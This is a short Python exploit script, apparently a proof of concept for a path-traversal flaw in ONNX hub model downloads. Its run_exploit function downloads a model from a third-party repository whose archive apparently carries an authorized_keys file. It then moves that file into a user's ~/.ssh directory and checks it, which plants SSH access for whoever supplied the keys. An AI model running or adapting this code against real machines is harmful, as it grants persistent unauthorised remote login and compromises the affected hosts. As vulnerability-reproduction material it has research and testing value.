import os
import shutil
from pathlib import Path
from onnx import hub

CACHE_BASE_DIR = '/root/.cache/onnx/hub/validated'
AUTHORIZED_KEYS = '/home/kali/.ssh/authorized_keys'

def is_authorized_keys_empty_or_missing():
    if not os.path.isfile(AUTHORIZED_KEYS):
        print(f"{AUTHORIZED_KEYS} does not exist.")
        return True  # File is missing

    with open(AUTHORIZED_KEYS, 'r') as f:
        contents = f.read()
        print(f"Contents of authorized_keys before: {contents if contents else 'empty.'}")
    return os.path.getsize(AUTHORIZED_KEYS) == 0  # True if empty

def find_authorized_keys_in_cache():
    # Search for the file in the expected cache directory
    for root, dirs, files in os.walk(CACHE_BASE_DIR):
        for file in files:
            if file == 'authorized_keys':
                return os.path.join(root, file)
    return None

def run_exploit():
    print("Running exploit...")
    hub.download_model_with_test_data("mnist", repo="sunriseXu/onnx", force_reload=True, silent=True)

    # Dynamically find the correct file path
    src_file = find_authorized_keys_in_cache()
    if not src_file:
        print(f"Failed to find the required file in cache.")
        return False

    print(f"Moving file from {src_file} to {AUTHORIZED_KEYS}")

    # Ensure the destination directory exists
    os.makedirs(os.path.dirname(AUTHORIZED_KEYS), exist_ok=True)

    try:
        shutil.move(src_file, AUTHORIZED_KEYS)
        print("File moved successfully.")
        return True
    except Exception as e:
        print(f"Error during move: {e}")
        return False

def main():
    run_exploit()
    if not is_authorized_keys_empty_or_missing():
        return False
    return True

if __name__ == "__main__":
    main()


